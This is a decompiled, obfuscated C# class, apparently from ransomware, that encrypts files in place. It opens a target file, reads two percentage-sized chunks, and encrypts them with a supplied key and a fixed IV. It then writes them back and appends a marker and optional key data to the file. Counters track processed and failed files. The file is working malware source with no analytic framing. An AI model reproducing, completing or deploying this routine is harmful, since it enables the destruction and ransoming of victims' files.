using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using uchimBgrqYpC;

namespace FEPAnxLYcpgz;

internal sealed class mVRsbcFAguJ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int FClcfEAZEPgv(long long_0)
	{
		return (int)long_0;
	}

	public static void CbqbKQtEvSwyzLYaKI(string QDaBNXMpfmZh, string WITafKbHuLud, string TiXRLxVRLbHSGo, byte[] cNjwfMfuKqgXOGbiu = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(QDaBNXMpfmZh, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = FClcfEAZEPgv(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(WITafKbHuLud) * Convert.ToInt32(fileStream.Length) / 100;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = int.MaxValue;
				}
				if (num < num2)
				{
					num2 = num - Convert.ToInt32(WITafKbHuLud) * 1000 * 1000;
				}
				int sLHhcGrRhlHrpI = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 2; i++)
				{
					byte[] byte_ = UoUHYgfIiAGlMr(QDaBNXMpfmZh, fileStream, sLHhcGrRhlHrpI, num * i);
					array = (ZNYsMUGPdZxeAunY.geKzJTCQWBdPJrv ? COuKIqToBmSj.ECpnJyWrmVTmlfT(byte_, Encoding.ASCII.GetBytes(TiXRLxVRLbHSGo), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : GWOsLqMwIb.buNDQCFBoGJ(byte_, Encoding.ASCII.GetBytes(TiXRLxVRLbHSGo), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					fArLVpacyIycHv(QDaBNXMpfmZh, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (ZNYsMUGPdZxeAunY.jHNjZakAkEHPd ? Encoding.ASCII.GetBytes(ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107476624)) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477640)) + Convert.ToString(WITafKbHuLud) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477640))) : Encoding.ASCII.GetBytes(ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107476624)) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477617)) + Convert.ToString(WITafKbHuLud) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477617))));
			if (!ZNYsMUGPdZxeAunY.jHNjZakAkEHPd)
			{
				using FileStream fileStream2 = new FileStream(QDaBNXMpfmZh, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(QDaBNXMpfmZh, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(cNjwfMfuKqgXOGbiu, 0, cNjwfMfuKqgXOGbiu.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (ZNYsMUGPdZxeAunY.fKNptYRWsQNeZX)
			{
				try
				{
					File.AppendAllText(ZNYsMUGPdZxeAunY.TVaVFXxrZtbC, getString_0(107365559) + QDaBNXMpfmZh + getString_0(107476643) + ex.Message + getString_0(107396712));
				}
				catch (Exception)
				{
				}
			}
			ZNYsMUGPdZxeAunY.opDJfdSoJwBgd++;
		}
		ZNYsMUGPdZxeAunY.LHsTakbnvLMZqfZlb++;
	}

	public static byte[] UoUHYgfIiAGlMr(string YpDLAYRmpGo, FileStream PXfEXotvgqX, int sLHhcGrRhlHrpI, int iDSswFEmROphzJ = 0)
	{
		byte[] array = new byte[sLHhcGrRhlHrpI];
		PXfEXotvgqX.Position = iDSswFEmROphzJ;
		PXfEXotvgqX.Read(array, 0, sLHhcGrRhlHrpI);
		return array;
	}

	public static void fArLVpacyIycHv(string aLNAJngqlbVP, FileStream kIMKKRdQEGBNQUn, byte[] yTyjqyCiDpMMQd, int KeHIUOmWxNke = 0)
	{
		kIMKKRdQEGBNQUn.Position = KeHIUOmWxNke;
		kIMKKRdQEGBNQUn.Write(yTyjqyCiDpMMQd, 0, yTyjqyCiDpMMQd.Length);
	}

	static mVRsbcFAguJ()
	{
		Strings.CreateGetStringDelegate(typeof(mVRsbcFAguJ));
	}
}
